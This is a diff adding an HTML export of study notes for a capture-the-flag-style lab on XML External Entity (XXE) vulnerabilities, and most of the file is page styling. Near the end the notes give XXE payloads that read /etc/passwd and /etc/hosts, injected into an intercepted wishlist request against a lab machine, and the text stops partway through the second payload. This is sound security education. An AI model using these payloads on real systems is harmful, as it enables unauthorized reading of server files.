@@ -1,0 +1,747 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Day 5</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(50, 48, 44, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-default_background {
+	color: rgba(50, 48, 44, 1);
+}
+.highlight-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.highlight-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.block-color-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: undefined; }
+.select-value-color-pink { background-color: rgba(225, 136, 179, 0.27); }
+.select-value-color-purple { background-color: rgba(168, 129, 197, 0.27); }
+.select-value-color-green { background-color: rgba(123, 183, 129, 0.27); }
+.select-value-color-gray { background-color: rgba(84, 72, 49, 0.15); }
+.select-value-color-transparentGray { background-color: undefined; }
+.select-value-color-translucentGray { background-color: undefined; }
+.select-value-color-orange { background-color: rgba(224, 124, 57, 0.27); }
+.select-value-color-brown { background-color: rgba(210, 162, 141, 0.35); }
+.select-value-color-red { background-color: rgba(244, 171, 159, 0.4); }
+.select-value-color-yellow { background-color: rgba(236, 191, 66, 0.39); }
+.select-value-color-blue { background-color: rgba(93, 165, 206, 0.27); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="1547aacb-2d23-8017-a7c8-cc7b593552b6" class="page sans"><header><h1 class="page-title">Day 5</h1><p class="page-description"></p></header><div class="page-body"><h3 id="1547aacb-2d23-8080-876a-c6031854e83e" class=""><strong>Narrative Summary</strong></h3><ul id="1547aacb-2d23-80d3-9af2-d8aac4143d9e" class="bulleted-list"><li style="list-style-type:disc"><strong>Setting:</strong> Wareville, a town with a festive atmosphere and tech-savvy population.</li></ul><ul id="1547aacb-2d23-8023-a4e2-f17292e0c871" class="bulleted-list"><li style="list-style-type:disc"><strong>Problem:</strong> A dejected boy wishes for a teddy bear his family cannot afford.</li></ul><ul id="1547aacb-2d23-805c-970e-f3082cdd4756" class="bulleted-list"><li style="list-style-type:disc"><strong>Solution:</strong> Software and Mayor Malware create a platform called &quot;WishVille&quot; to collect and fulfill the townspeople&#x27;s Christmas wishes.</li></ul><ul id="1547aacb-2d23-80a7-9914-e3bb5ae5f0da" class="bulleted-list"><li style="list-style-type:disc"><strong>Challenge:</strong> Due to the rush to launch, the platform lacks proper security testing, leading to potential vulnerabilities.</li></ul><h3 id="1547aacb-2d23-8050-9404-eeece1f0e732" class=""><strong>Learning Objectives</strong></h3><ol type="1" id="1547aacb-2d23-8092-b7ee-d4dd8d3570f0" class="numbered-list" start="1"><li>Understand XML and its components.</li></ol><ol type="1" id="1547aacb-2d23-8056-b765-f3c4c48843b1" class="numbered-list" start="2"><li>Explore XML External Entity (XXE) vulnerabilities.</li></ol><ol type="1" id="1547aacb-2d23-8029-a262-e624c2ad1cc1" class="numbered-list" start="3"><li>Learn to exploit XXE.</li></ol><ol type="1" id="1547aacb-2d23-80d5-84b6-d02307e2435b" class="numbered-list" start="4"><li>Identify and implement remediation measures.</li></ol><hr id="1547aacb-2d23-80fd-9161-e8857cea4d0a"/><h3 id="1547aacb-2d23-8095-9b9f-d2154ba99a7e" class=""><strong>Important Concepts</strong></h3><ol type="1" id="1547aacb-2d23-8068-a922-d52415aa31e5" class="numbered-list" start="1"><li><strong>Extensible Markup Language (XML):</strong><ul id="1547aacb-2d23-8066-b86f-e6c53956f755" class="bulleted-list"><li style="list-style-type:disc">XML is used to transport and store structured data.</li></ul><ul id="1547aacb-2d23-80b5-8647-d7df1e31a301" class="bulleted-list"><li style="list-style-type:disc">Comparable to a filing cabinet, where tags act as folders organizing data.</li></ul><ul id="1547aacb-2d23-8011-9da2-dd5fd2aa154d" class="bulleted-list"><li style="list-style-type:disc">Example:<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1547aacb-2d23-809e-9f73-d2938b2be6ff" class="code"><code class="language-XML" style="white-space:pre-wrap;word-break:break-all">xml
+Copy code
+&lt;people&gt;
+   &lt;name&gt;Glitch&lt;/name&gt;
+   &lt;address&gt;Wareville&lt;/address&gt;
+   &lt;email&gt;glitch@wareville.com&lt;/email&gt;
+   &lt;phone&gt;111000&lt;/phone&gt;
+&lt;/people&gt;
+
+</code></pre></li></ul></li></ol><ol type="1" id="1547aacb-2d23-8045-ac60-e62210f88b93" class="numbered-list" start="2"><li><strong>Document Type Definition (DTD):</strong><ul id="1547aacb-2d23-8005-bca2-ec0908f0e814" class="bulleted-list"><li style="list-style-type:disc">Defines the structure of XML documents (rules for allowed elements and attributes).</li></ul><ul id="1547aacb-2d23-801d-898c-dca6907ff67b" class="bulleted-list"><li style="list-style-type:disc">Example:<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1547aacb-2d23-8059-8b05-f7c6f9822fde" class="code"><code class="language-XML" style="white-space:pre-wrap;word-break:break-all">xml
+Copy code
+&lt;!DOCTYPE people [
+   &lt;!ELEMENT people(name, address, email, phone)&gt;
+   &lt;!ELEMENT name (#PCDATA)&gt;
+   &lt;!ELEMENT address (#PCDATA)&gt;
+   &lt;!ELEMENT email (#PCDATA)&gt;
+   &lt;!ELEMENT phone (#PCDATA)&gt;
+]&gt;
+
+</code></pre></li></ul></li></ol><ol type="1" id="1547aacb-2d23-80da-b0b3-f0696a8dedd2" class="numbered-list" start="3"><li><strong>Entities in XML:</strong><ul id="1547aacb-2d23-80a9-9c24-e10f8673f039" class="bulleted-list"><li style="list-style-type:disc">Placeholders for repeated data or references to internal/external files.</li></ul><ul id="1547aacb-2d23-80bd-9472-e6a8af924689" class="bulleted-list"><li style="list-style-type:disc">Example of an external entity:<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1547aacb-2d23-8028-8a99-ddda402d3005" class="code"><code class="language-XML" style="white-space:pre-wrap;word-break:break-all">xml
+Copy code
+&lt;!ENTITY ext SYSTEM &quot;http://tryhackme.com/robots.txt&quot;&gt;
+
+</code></pre></li></ul></li></ol><ol type="1" id="1547aacb-2d23-805b-a1cb-f6052779a4c7" class="numbered-list" start="4"><li><strong>XML External Entity (XXE):</strong><ul id="1547aacb-2d23-80b6-bf76-ec6ca6c0be1f" class="bulleted-list"><li style="list-style-type:disc">Vulnerability arising from improper handling of external entities in XML parsers.</li></ul><ul id="1547aacb-2d23-8020-9f84-f0b67cb0c544" class="bulleted-list"><li style="list-style-type:disc">Can expose sensitive files or execute malicious code.</li></ul><ul id="1547aacb-2d23-80df-aee1-c2e88d7492e8" class="bulleted-list"><li style="list-style-type:disc">Example exploit:<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1547aacb-2d23-80cc-bc2c-f25c8f627d63" class="code"><code class="language-XML" style="white-space:pre-wrap;word-break:break-all">xml
+Copy code
+&lt;!DOCTYPE people[
+   &lt;!ENTITY thmFile SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+&lt;people&gt;
+   &lt;address&gt;&amp;thmFile;&lt;/address&gt;
+&lt;/people&gt;
+
+</code></pre></li></ul></li></ol><hr id="1547aacb-2d23-808a-a242-cdab1b840087"/><h3 id="1547aacb-2d23-80f8-a2f0-cc3126e56715" class=""><strong>Practical Application</strong></h3><ol type="1" id="1547aacb-2d23-805f-8dee-c0b51a4d260d" class="numbered-list" start="1"><li><strong>Connecting to the Platform:</strong><ul id="1547aacb-2d23-80d3-884f-e1fef2e3c3d4" class="bulleted-list"><li style="list-style-type:disc">Use tools like Burp Suite to intercept and analyze web traffic.</li></ul><ul id="1547aacb-2d23-809a-b511-d34e405b5050" class="bulleted-list"><li style="list-style-type:disc">Access the WishVille application hosted on <code>http://MACHINE_IP</code>.</li></ul></li></ol><ol type="1" id="1547aacb-2d23-8012-b4fc-e0fe48fd6cef" class="numbered-list" start="2"><li><strong>Flow of Application:</strong><ul id="1547aacb-2d23-80dc-b4f8-da45f0e34a93" class="bulleted-list"><li style="list-style-type:disc">Browse and add products to a wishlist at <code>product.php</code>.</li></ul><ul id="1547aacb-2d23-80f0-a610-e244e657f906" class="bulleted-list"><li style="list-style-type:disc">View the cart at <code>cart.php</code> and proceed to checkout.</li></ul></li></ol><ol type="1" id="1547aacb-2d23-8060-908f-ea1f44f13582" class="numbered-list" start="3"><li><strong>Intercepting Requests:</strong><ul id="1547aacb-2d23-807f-ba83-cb26d3705d68" class="bulleted-list"><li style="list-style-type:disc">Burp Suite configuration:<ul id="1547aacb-2d23-80fb-9d88-e57e9c88c277" class="bulleted-list"><li style="list-style-type:circle">Proxy -&gt; HTTP history tab: Intercept and modify requests.</li></ul></li></ul><ul id="1547aacb-2d23-804b-86bd-f1149de07490" class="bulleted-list"><li style="list-style-type:disc">Example intercepted XML:<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1547aacb-2d23-8047-b26b-f305eaf1936c" class="code"><code class="language-XML" style="white-space:pre-wrap;word-break:break-all">xml
+Copy code
+&lt;wishlist&gt;
+   &lt;user_id&gt;1&lt;/user_id&gt;
+   &lt;item&gt;
+      &lt;product_id&gt;1&lt;/product_id&gt;
+   &lt;/item&gt;
+&lt;/wishlist&gt;
+
+</code></pre></li></ul></li></ol><ol type="1" id="1547aacb-2d23-80ac-866d-e565a1102eae" class="numbered-list" start="4"><li><strong>Exploitation via XXE:</strong><ul id="1547aacb-2d23-80bb-9d4f-f07da6d1d302" class="bulleted-list"><li style="list-style-type:disc">Update XML payload to include an external entity:<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1547aacb-2d23-808e-b748-dc8c0ab54924" class="code"><code class="language-XML" style="white-space:pre-wrap;word-break:break-all">xml
+Copy code
+&lt;!DOCTYPE foo [
+   &lt;!ENTITY payload SYSTEM &quot;/etc/hosts&quot;&gt;
+]&gt;
+&lt;wishlist&gt;
+   &lt;item&gt;
